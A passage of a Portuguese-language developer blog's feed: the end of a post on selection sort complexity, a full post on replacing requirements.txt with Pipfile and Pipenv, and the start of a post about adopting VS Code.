&lt;li&gt;Encontre o menor número entre posições 5 e 6;&lt;/li&gt;
&lt;li&gt;Troque &lt;code&gt;array[i]&lt;/code&gt; com &lt;code&gt;array[5]&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[2, 4, 5, 7, 8, 9]&lt;/code&gt;:&lt;/li&gt;
&lt;li&gt;&lt;code&gt;i=6&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;Fim do laço.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Podemos separar a análise em 3 grupos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Tempo de execução para encontrar o menor elemento&lt;/li&gt;
&lt;li&gt;Tempo de execução para trocar de elemento&lt;/li&gt;
&lt;li&gt;Tempo de execução do laço&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Embora seja possível fazer uma análise detalhada, levando em consideração
o número de passos dentro de uma operação de swap de valores, e a aritmética
envolvendo as &lt;code&gt;n-i-1&lt;/code&gt; chamadas que ocorrem dentro da função
“Encontre o menor número entre posições”, para fins didáticos vamos adotar
uma abordagem superficial.&lt;/p&gt;
&lt;p&gt;Selecionar o menor elemento no &lt;em&gt;array&lt;/em&gt; e fazer o &lt;em&gt;swap&lt;/em&gt; para a primeira
posição requer passar por todos os &lt;code&gt;n-1&lt;/code&gt; elementos. Encontrar o próximo
menor elemento requer analisar os &lt;code&gt;n-1&lt;/code&gt; elementos restantes. Com dois
for aninhados, executando em ordem &lt;code&gt;n&lt;/code&gt;, já podemos esperar uma execução
em &lt;code&gt;O(n²)&lt;/code&gt;. É possível usar a &lt;a href="https://en.wikipedia.org/wiki/Arithmetic_progression" title="Leia mais sobre"&gt;progressão aritmética&lt;/a&gt;
para comprovar essa hipótese:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(n − 1) + (n − 2) + ... + 2 + 1 = n(n - 1) / 2 ∈ Θ(n²)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Se revisarmos o algoritmo apresentado, é possível reparar que o
&lt;em&gt;Selection Sort&lt;/em&gt; tem no seu melhor e pior cenário o tempo de execução de
&lt;code&gt;n²&lt;/code&gt;, logo, podendo ser classificado como &lt;code&gt;Θ(n²)&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Nos próximos posts vamos nos aprofundar um pouco mais nos detalhes dessa
análise, e passar por alguns algoritmos úteis e muito comuns na nossa rotina.&lt;/p&gt;
&lt;p&gt;Até a próxima!&lt;/p&gt;
&lt;p&gt;Esse &lt;em&gt;post&lt;/em&gt; foi originalmente escrito para o &lt;a href="https://www.profissionaisti.com.br/2016/10/analise-de-algoritmos-analise-assintotica/" title="Análise de algoritmos: Análise Assintótica"&gt;&lt;em&gt;Profissionais TI&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://pt.khanacademy.org/computing/computer-science/algorithms/sorting-algorithms/a/analysis-of-selection-sort"&gt;Análise do Selection Sort – Khan Academy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://justin.abrah.ms/computer-science/how-to-calculate-big-o.html"&gt;Justin Abrahms – Big-O is easy to calculate, if you know how&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://discrete.gr/complexity/"&gt;National Technical University of Athens – A gentle introduction to Algorithm Complexity Analysis&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.perlmonks.org/?node_id=573138"&gt;Perl Monks – Big-O Notation: What’s is it good for?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.tutorialspoint.com/data_structures_algorithms/asymptotic_analysis.htm"&gt;Tutorials Point – Data Structures Asymptotic Analysis&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikibooks.org/wiki/Data_Structures/Asymptotic_Notation"&gt;Wikibooks – Data Structures/Asymptotic Notation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pt.wikipedia.org/wiki/Algoritmo"&gt;Wikipedia – Algoritmo&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="estrutura-de-dados"></category><category term="algoritmos"></category></entry><entry><title>Tchau, requirements. Olá, Pipfile!</title><link href="https://klauslaube.com.br/2018/06/11/tchau-requirements-ola-pipfile.html" rel="alternate"></link><published>2018-06-11T16:40:00-03:00</published><updated>2018-06-11T16:40:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2018-06-11:/2018/06/11/tchau-requirements-ola-pipfile.html</id><summary type="html">&lt;p&gt;Admito que no começo fui cético em relação ao &lt;a href="https://github.com/pypa/pipfile" title="The replacement for requirements.txt"&gt;&lt;em&gt;Pipfile&lt;/em&gt;&lt;/a&gt;. Pode ser a idade, mas questionei a real necessidade do mesmo. Para mim era muito óbvio! Eu já tinha o &lt;a href="https://klauslaube.com.br/tag/pip.html" title="Leia mais sobre pip"&gt;&lt;em&gt;pip&lt;/em&gt;&lt;/a&gt;, o &lt;a href="https://klauslaube.com.br/tag/virtualenv.html" title="Leia mais sobre virtualenv"&gt;&lt;em&gt;virtualenv&lt;/em&gt;&lt;/a&gt; e até mesmo o &lt;a href="https://klauslaube.com.br/tag/.html" title="Leia mais sobre Pyenv"&gt;&lt;em&gt;pyenv&lt;/em&gt;&lt;/a&gt;. Hoje, após ler alguns artigos e debater com alguns colegas, fico até …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Admito que no começo fui cético em relação ao &lt;a href="https://github.com/pypa/pipfile" title="The replacement for requirements.txt"&gt;&lt;em&gt;Pipfile&lt;/em&gt;&lt;/a&gt;. Pode ser a idade, mas questionei a real necessidade do mesmo. Para mim era muito óbvio! Eu já tinha o &lt;a href="https://klauslaube.com.br/tag/pip.html" title="Leia mais sobre pip"&gt;&lt;em&gt;pip&lt;/em&gt;&lt;/a&gt;, o &lt;a href="https://klauslaube.com.br/tag/virtualenv.html" title="Leia mais sobre virtualenv"&gt;&lt;em&gt;virtualenv&lt;/em&gt;&lt;/a&gt; e até mesmo o &lt;a href="https://klauslaube.com.br/tag/.html" title="Leia mais sobre Pyenv"&gt;&lt;em&gt;pyenv&lt;/em&gt;&lt;/a&gt;. Hoje, após ler alguns artigos e debater com alguns colegas, fico até envergonhado de não ter visto o potencial da ferramenta no seu primeiro momento.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Se você está na dúvida, assim como eu estive, vem comigo que te mostro as principais vantagens do &lt;em&gt;Pipfile&lt;/em&gt; (e do &lt;em&gt;Pipenv&lt;/em&gt;).&lt;/p&gt;
&lt;h2&gt;O que há de errado com o requirements.txt?&lt;/h2&gt;
&lt;p&gt;Esse foi o meu "turning point" em relação ao &lt;em&gt;Pipfile&lt;/em&gt;. E foi o &lt;a href="https://twitter.com/rcmachado" title="Perfil no Twitter"&gt;&lt;em&gt;@rcmachado&lt;/em&gt;&lt;/a&gt; quem respondeu essa pergunta:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;O build não é determinístico.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Vamos supor que estamos desenvolvendo um projeto em &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;. Instalamos via &lt;code&gt;pip install Django&lt;/code&gt;, e jogamos a dependência no &lt;code&gt;requirements.txt&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;#&lt;/span&gt; &lt;span class="n"&gt;requirements&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;

&lt;span class="n"&gt;Django&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como você garante que a mesma versão do &lt;em&gt;Django&lt;/em&gt; está instalada nos diferentes ambientes do projeto (dev, qa, staging, production, etc)? Da forma acima, você não garante. O &lt;code&gt;pip&lt;/code&gt; instalará a última versão do pacote disponível no &lt;a href="https://pypi.org/" title="The Python Package Index"&gt;&lt;em&gt;PyPI&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Para minimizar esse problema, podemos "pinar" a versão do &lt;em&gt;Django&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;#&lt;/span&gt; &lt;span class="n"&gt;requirements&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;

&lt;span class="n"&gt;Django&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Agora garantimos a versão do &lt;em&gt;framework&lt;/em&gt; em todos os ambientes do projeto. Sabemos que o &lt;em&gt;Django&lt;/em&gt; tem uma dependência, o &lt;a href="http://pytz.sourceforge.net/" title="World Timezone Definitions for Python"&gt;&lt;em&gt;pytz&lt;/em&gt;&lt;/a&gt;, o que acontece com ela?&lt;/p&gt;
&lt;p&gt;Bem... se o &lt;em&gt;framework&lt;/em&gt; estabelecer exatamente qual versão da dependência ele utiliza, não será um problema. Mas &lt;a href="https://github.com/django/django/blob/master/setup.py#L86"&gt;nem sempre isso acontece&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# django/setup.py&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;setup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;install_requires&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;pytz&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para garantir que a mesma versão do &lt;em&gt;pytz&lt;/em&gt; está sendo instalada nos diferentes ambientes do projeto, podemos "pinar" a sua versão no &lt;code&gt;requirements.txt&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;#&lt;/span&gt; &lt;span class="n"&gt;requirements&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;

&lt;span class="n"&gt;Django&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;
&lt;span class="n"&gt;pytz&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;2018&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E por fim, adicionar um &lt;code&gt;--no-deps&lt;/code&gt; ao comando &lt;code&gt;pip&lt;/code&gt;, assim ele se manterá fiel às dependências descritas no &lt;code&gt;requirements.txt&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install -r requirements.txt --no-deps
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Note que você virou responsável por uma função que deveria ser desempenhada pelo &lt;em&gt;package manager&lt;/em&gt;. Com o passar do tempo, esse tipo de gestão passa a ser árdua e suscetível a erros.&lt;/p&gt;
&lt;h2&gt;Pipfile to the rescue&lt;/h2&gt;
&lt;p&gt;Segundo o &lt;a href="https://github.com/pypa/pipfile" title="the replacement for requirements.txt"&gt;repositório oficial&lt;/a&gt;, o &lt;em&gt;Pipfile&lt;/em&gt; é:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) a replacement for the existing standard pip's requirements.txt file.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Como esperado, o padrão traz melhorias em relação ao &lt;code&gt;requirements.txt&lt;/code&gt;. O já citado "ambientes determinísticos" é alcançado através do &lt;code&gt;Pipfile.lock&lt;/code&gt;, um conceito usado em gerenciadores de pacotes de outras linguagens, como &lt;a href="http://bundler.io/" title="Package manager do Ruby"&gt;&lt;em&gt;Bundler&lt;/em&gt;&lt;/a&gt;, &lt;a href="https://crates.io/" title="Package manager do Rust"&gt;&lt;em&gt;Cargo&lt;/em&gt;&lt;/a&gt; ou &lt;a href="https://yarnpkg.com/en/" title="Package manager do Node"&gt;&lt;em&gt;Yarn&lt;/em&gt;&lt;/a&gt;, onde as versões das dependências são "congeladas", garantindo que você obtenha o mesmo resultado em qualquer ambiente, e executando quantas vezes quiser.&lt;/p&gt;
&lt;p&gt;Outra vantagem é o uso de um único arquivo para diferentes ambientes. Com o uso de &lt;em&gt;requirements&lt;/em&gt;, geralmente acabamos com um arquivo de texto específico para cada ambiente:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;#&lt;/span&gt; &lt;span class="n"&gt;requirements&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;

&lt;span class="n"&gt;Django&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Mais um para dependências exclusivas do ambiente de desenvolvimento:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;#&lt;/span&gt; &lt;span class="n"&gt;requirements&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;dev&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;

&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="n"&gt;requirements&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;

&lt;span class="n"&gt;django&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;debug&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;toolbar&lt;/span&gt;
&lt;span class="n"&gt;pytest&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Com o &lt;em&gt;Pipfile&lt;/em&gt;, é possível utilizar o mesmo arquivo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Pipfile&lt;/span&gt;

&lt;span class="k"&gt;[[source]]&lt;/span&gt;
&lt;span class="na"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;https://pypi.org/simple&amp;quot;&lt;/span&gt;
&lt;span class="na"&gt;verify_ssl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;true&lt;/span&gt;
&lt;span class="na"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;pypi&amp;quot;&lt;/span&gt;

&lt;span class="k"&gt;[dev-packages]&lt;/span&gt;
&lt;span class="na"&gt;pytest&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;*&amp;quot;&lt;/span&gt;

&lt;span class="k"&gt;[packages]&lt;/span&gt;
&lt;span class="na"&gt;Django&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;*&amp;quot;&lt;/span&gt;

&lt;span class="k"&gt;[requires]&lt;/span&gt;
&lt;span class="na"&gt;python_version&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;3.6&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Pipfile != Pipenv&lt;/h2&gt;
&lt;p&gt;Grande parte dos artigos que lí sobre &lt;em&gt;Pipfile&lt;/em&gt; começavam com algum comando como o abaixo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pipenv install django
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Uma coisa que tem que ficar clara é: O &lt;em&gt;Pipenv&lt;/em&gt; está para o &lt;em&gt;pip&lt;/em&gt;, assim como o &lt;em&gt;Pipfile&lt;/em&gt; está para o &lt;em&gt;requirements&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/rambo-knife.jpg" width="640" height="310" title="Pipenv é tipo a faca do Rambo. Resolve qualquer parada (mann.tv)" alt="Pipenv é tipo a faca do Rambo. Resolve qualquer parada (mann.tv)"&gt;&lt;/p&gt;
&lt;p&gt;Até o momento da publicação desse artigo, o &lt;code&gt;pip&lt;/code&gt; não suporta o formato do &lt;em&gt;Pipfile&lt;/em&gt; (ou pelo menos a versão que tenho instalada aqui). Portanto, a maneira mais conveniente de utilizar o &lt;em&gt;Pipfile&lt;/em&gt; hoje é através do utilitário de linha de comando &lt;code&gt;pipenv&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Segundo o &lt;a href="https://github.com/pypa/pipenv" title="Python Development Workflow for Humans"&gt;repositório oficial&lt;/a&gt;, o &lt;em&gt;Pipenv&lt;/em&gt; é:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) a tool that aims to bring the best of all packaging worlds (bundler, composer, npm, cargo, yarn, etc.) to the Python world. Windows is a first–class citizen, in our world.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Através do &lt;em&gt;parsing&lt;/em&gt; do &lt;em&gt;Pipfile&lt;/em&gt;, a ferramenta resolve dependências do projeto (através dos parâmetros &lt;code&gt;install&lt;/code&gt;, &lt;code&gt;uninstall&lt;/code&gt; ou &lt;code&gt;update&lt;/code&gt;), exibe a árvore de dependências (através do parâmetro &lt;code&gt;graph&lt;/code&gt;) e analisa as mesmas (através do &lt;code&gt;check&lt;/code&gt;). Mas além de atuar como um gerenciador de pacotes, o &lt;em&gt;Pipenv&lt;/em&gt; tem uma funcionalidade fantástica: Cria e gerencia &lt;em&gt;virtualenvs&lt;/em&gt; de forma automática.&lt;/p&gt;
&lt;h2&gt;Virtualização out of the box&lt;/h2&gt;
&lt;p&gt;Já escrevi sobre virtualização com &lt;a href="https://klauslaube.com.br/2015/07/23/virtualenvwrapper-o-basico-para-um-bom-ambiente-de-desenvolvimento-python.html" title="Artigo sobre Virtualenvwrapper"&gt;&lt;em&gt;virtualenv&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://klauslaube.com.br/2016/04/26/o-simples-e-poderoso-pyenv.html" title="Artigo sobre pyenv"&gt;&lt;em&gt;pyenv&lt;/em&gt;&lt;/a&gt;. Com o &lt;em&gt;Pipenv&lt;/em&gt;, a coisa fica significativamente mais simples.&lt;/p&gt;
&lt;p&gt;Ao executar o comando &lt;code&gt;pipenv install&lt;/code&gt;, por exemplo, a ferramenta automaticamente criará um &lt;em&gt;virtualenv&lt;/em&gt; (caso não exista) para o projeto no qual você está trabalhando. Por exemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nv"&gt;mkdir&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;p&lt;/span&gt; &lt;span class="o"&gt;~/&lt;/span&gt;&lt;span class="nv"&gt;workspace&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;test&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;pipenv&lt;/span&gt;
$ &lt;span class="nv"&gt;cd&lt;/span&gt; &lt;span class="o"&gt;~/&lt;/span&gt;&lt;span class="nv"&gt;workspace&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;test&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;pipenv&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;
$ &lt;span class="nv"&gt;pipenv&lt;/span&gt; &lt;span class="nv"&gt;install&lt;/span&gt; &lt;span class="nv"&gt;django&lt;/span&gt;

&lt;span class="nv"&gt;Creating&lt;/span&gt; &lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="nv"&gt;virtualenv&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nv"&gt;this&lt;/span&gt; &lt;span class="nv"&gt;project&lt;/span&gt;…
&lt;span class="nv"&gt;Using&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;klaus&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;.&lt;span class="nv"&gt;pyenv&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;versions&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;.&lt;span class="mi"&gt;7&lt;/span&gt;.&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;python2&lt;/span&gt;.&lt;span class="mi"&gt;7&lt;/span&gt; &lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;.&lt;span class="mi"&gt;7&lt;/span&gt;.&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;to&lt;/span&gt; &lt;span class="nv"&gt;create&lt;/span&gt; &lt;span class="nv"&gt;virtualenv&lt;/span&gt;…
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Caso você esteja curioso para saber aonde o seu &lt;em&gt;virtualenv&lt;/em&gt; foi parar, o comando abaixo pode ajudar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pipenv --venv

/home/klaus/.local/share/virtualenvs/test-pipenv-BzNa0eOE
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Mas você não precisa se preocupar em saber onde o &lt;code&gt;activate.sh&lt;/code&gt; está. Para ativar o &lt;em&gt;virtualenv&lt;/em&gt; criado, o parâmetro &lt;code&gt;shell&lt;/code&gt; é a melhor saída:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nv"&gt;pipenv&lt;/span&gt; &lt;span class="nv"&gt;shell&lt;/span&gt;

&lt;span class="nv"&gt;Spawning&lt;/span&gt; &lt;span class="nv"&gt;environment&lt;/span&gt; &lt;span class="nv"&gt;shell&lt;/span&gt; &lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;zsh&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;. &lt;span class="nv"&gt;Use&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="s"&gt;exit&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="nv"&gt;to&lt;/span&gt; &lt;span class="nv"&gt;leave&lt;/span&gt;.
. &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;klaus&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;.&lt;span class="nv"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;share&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;virtualenvs&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;test&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;pipenv&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;BzNa0eOE&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;activate&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Frustrado com o &lt;em&gt;Python 2.7&lt;/em&gt;? Sem problemas! Vamos transformar o projeto em &lt;em&gt;Python 3&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pipenv install --three
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O comando criará um novo &lt;em&gt;virtualenv&lt;/em&gt;, dessa vez com a versão mais recente da linguagem. Não esqueça de atualizar o &lt;code&gt;python_version&lt;/code&gt; do &lt;code&gt;Pipfile&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Com o &lt;a href="https://devcenter.heroku.com/articles/python-support" title="Python Support - Heroku"&gt;&lt;em&gt;Heroku&lt;/em&gt; adotando &lt;em&gt;Pipfile&lt;/em&gt;&lt;/a&gt;, me senti mais motivado a migrar alguns projetos para o padrão.&lt;/p&gt;
&lt;p&gt;Como resultado, tenho simplificado a &lt;em&gt;stack&lt;/em&gt; dos mesmos. Antes, eu gerenciava os ambientes virtuais com um &lt;em&gt;mix&lt;/em&gt; de &lt;em&gt;virtualenvwrapper&lt;/em&gt; e &lt;em&gt;pyenv&lt;/em&gt;. Hoje, com apenas um utilitário de linha de comando, sou capaz de gerenciar dependências e virtualização. Além disso, acredito que o &lt;em&gt;setup&lt;/em&gt; de um projeto &lt;em&gt;Python&lt;/em&gt; fique mais homogêneo, uma vez que não há necessidade de um combo &lt;code&gt;pip + {virtualenv,virtualenvwrapper,pyenv}&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.mattlayman.com/2017/using-pipfile-for-fun-and-profit.html"&gt;mattlayman - Using Pipfile for fun and profit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/grupy-rn/gerenciando-suas-depend%C3%AAncias-e-ambientes-python-com-pipenv-9e5413513fa6"&gt;Medium - Gerenciando suas dependências e ambientes python com pipenv&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.pipenv.org"&gt;Pipenv - Python Dev Workflow for Humans&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://realpython.com/pipenv-guide/"&gt;Real Python - Pipenv: A Guide to the New Python Packaging Tool&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="python"></category><category term="pip"></category><category term="virtualenv"></category><category term="pipfile"></category><category term="pipenv"></category></entry><entry><title>Eu me rendo: VS Code</title><link href="https://klauslaube.com.br/2018/06/04/eu-me-rendo-vscode.html" rel="alternate"></link><published>2018-06-04T16:30:00-03:00</published><updated>2018-06-04T16:30:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2018-06-04:/2018/06/04/eu-me-rendo-vscode.html</id><summary type="html">&lt;p&gt;É, caro leitor... chegou o dia de admitir que tenho usado outro editor
além do &lt;a href="https://klauslaube.com.br/tag/vim.html" title="Leia mais sobre o melhor editor do universo"&gt;&lt;em&gt;Vim&lt;/em&gt;&lt;/a&gt;. Pode
me julgar, me chamar de "poser" ou de "vendido", mas acontece que tenho descoberto no
&lt;a href="https://code.visualstudio.com/" title="Conheça o VS Code"&gt;&lt;em&gt;VS Code&lt;/em&gt;&lt;/a&gt;, da &lt;em&gt;Microsoft&lt;/em&gt;,
